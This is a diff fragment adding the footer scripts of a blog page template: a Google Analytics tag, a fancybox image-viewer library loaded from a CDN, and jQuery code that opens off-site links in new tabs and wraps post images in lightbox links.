+<script async src="https://www.googletagmanager.com/gtag/js?id=G-FF5KPQ1CZ6"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-FF5KPQ1CZ6');
+</script>
+
+<script src="https://cdn.staticfile.org/fancybox/2.1.7/js/jquery.fancybox.min.js"></script>
+<script>
+$(document).ready(function () {
+    $(".entry a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $(".entry img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+
+</body>
+
+</html>
